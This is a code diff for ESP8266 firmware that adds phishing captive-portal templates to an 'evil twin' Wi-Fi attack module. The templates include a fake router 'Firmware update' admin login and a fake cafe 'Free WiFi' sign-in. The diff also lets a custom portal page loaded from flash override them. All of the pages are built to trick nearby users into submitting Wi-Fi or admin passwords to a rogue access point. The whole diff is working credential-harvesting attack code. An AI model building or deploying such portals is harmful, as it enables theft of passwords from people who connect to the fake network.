@@ -4,9 +4,11 @@
 #include "BlazeEvilTwin.h"
 
 #include <ESP8266WiFi.h>
+#include <LittleFS.h>
 
 #include "Accesspoints.h"
 #include "wifi.h"
+#include "BlazeCfg.h"
 
 extern Accesspoints accesspoints;
 extern String escape(String str);
@@ -142,7 +144,37 @@ namespace BlazeEvilTwin {
         return activeFlag;
     }
 
-    String portalHtml() {
+    // ===== portal templates (plan 3.4) =====
+    // 0 = matrix (hacker green), 1 = router admin, 2 = venue/cafe
+    // persisted in BlazeCfg "twin.template"
+    int templateId() {
+        long t = BlazeCfg::getInt("twin.template", 0);
+        if (t < 0 || t > 2) t = 0;
+        return (int)t;
+    }
+
+    void setTemplate(int id) {
+        if (id < 0) id = 0;
+        if (id > 2) id = 2;
+        BlazeCfg::set("twin.template", String(id));
+    }
+
+    int cycleTemplate() {
+        int next = (templateId() + 1) % 3;
+        setTemplate(next);
+        return next;
+    }
+
+    const char* templateName() {
+        switch (templateId()) {
+            case 1:  return "router";
+            case 2:  return "venue";
+            default: return "matrix";
+        }
+    }
+
+    // template 0: matrix (original BLAZE style)
+    String portalMatrix() {
         String html;
         html.reserve(900);
         html += F("<!DOCTYPE html><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'>");
@@ -151,5 +183,51 @@ namespace BlazeEvilTwin {
         html += escape(ssid);
         html += F("</label><input type=password name=p placeholder='Password' required><input type=text name=u placeholder='Username (optional)'><button type=submit>Connect</button></form>");
         return html;
+    }
+
+    // template 1: router admin / firmware update
+    String portalRouter() {
+        String html;
+        html.reserve(1000);
+        html += F("<!DOCTYPE html><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'>");
+        html += F("<title>Router Login</title><style>body{background:#f4f6fb;color:#1c2733;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}form{background:#fff;border:1px solid #ccd6e0;border-radius:8px;padding:24px;max-width:340px;width:90%;box-shadow:0 2px 10px rgba(0,0,0,.08)}h2{margin:0 0 4px;font-size:18px}p{color:#5b6b7c;font-size:13px;margin:4px 0 12px}input{width:100%;padding:10px;margin:6px 0;border:1px solid #ccd6e0;border-radius:4px;box-sizing:border-box}button{background:#2563eb;color:#fff;border:0;border-radius:4px;padding:10px 16px;font-weight:bold;width:100%;cursor:pointer}</style>");
+        html += F("<form method=POST action=/><h2>Firmware update</h2><p>Network <b>");
+        html += escape(ssid);
+        html += F("</b> needs an administrator sign-in to apply the update.</p><input type=password name=p placeholder='Admin password' required><input type=text name=u placeholder='Username (optional)'><button type=submit>Apply update</button></form>");
+        return html;
+    }
+
+    // template 2: venue / cafe free WiFi
+    String portalVenue() {
+        String html;
+        html.reserve(1000);
+        html += F("<!DOCTYPE html><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'>");
+        html += F("<title>Free WiFi</title><style>body{background:#fff8ef;color:#4a3728;font-family:Georgia,serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}form{background:#fff;border:2px solid #e8a33d;border-radius:14px;padding:26px;max-width:330px;width:90%;text-align:center}h2{margin:0 0 6px;color:#c2711d}p{font-size:14px;margin:4px 0 14px}input{width:100%;padding:11px;margin:6px 0;border:1px solid #e0c9a8;border-radius:6px;box-sizing:border-box;font-size:14px}button{background:#e8a33d;color:#fff;border:0;border-radius:6px;padding:11px 18px;font-size:15px;width:100%;cursor:pointer}</style>");
+        html += F("<form method=POST action=/><h2>Free WiFi</h2><p>Welcome to <b>");
+        html += escape(ssid);
+        html += F("</b><br>Sign in to get online</p><input type=text name=u placeholder='Room / member no.'><input type=password name=p placeholder='Password' required><button type=submit>Connect</button></form>");
+        return html;
+    }
+
+    String portalHtml() {
+        // 1) user override: LittleFS /portal.html (supports %SSID% placeholder)
+        if (LittleFS.exists("/portal.html")) {
+            File f = LittleFS.open("/portal.html", "r");
+            if (f) {
+                String html = f.readString();
+                f.close();
+                if (html.length() > 0 && html.length() < 12000) {
+                    html.replace("%SSID%", escape(ssid));
+                    return html;
+                }
+            }
+        }
+
+        // 2) built-in template chosen in the main menu ("TWIN <style>")
+        switch (templateId()) {
+            case 1:  return portalRouter();
+            case 2:  return portalVenue();
+            default: return portalMatrix();
+        }
     }
 }
